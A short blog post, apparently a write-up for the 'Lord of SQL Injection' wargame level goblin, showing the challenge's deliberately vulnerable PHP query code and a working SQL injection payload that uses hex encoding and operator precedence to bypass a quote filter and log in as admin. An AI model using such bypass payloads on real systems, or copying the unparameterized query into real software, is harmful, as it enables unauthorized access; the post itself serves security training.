---
layout: post
title:  "los prob_goblin"
date:   2019-08-10
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_goblin where id='guest' and no=

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
~~~

# Solve

* and는 or보다 우선 연산함
* '(싱글쿼터)가 막혀 있으므로 hex로 우회

### ?no=0 or id=0x61646d696e

실행되는 구문 -> select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e

## GOBLIN Clear!
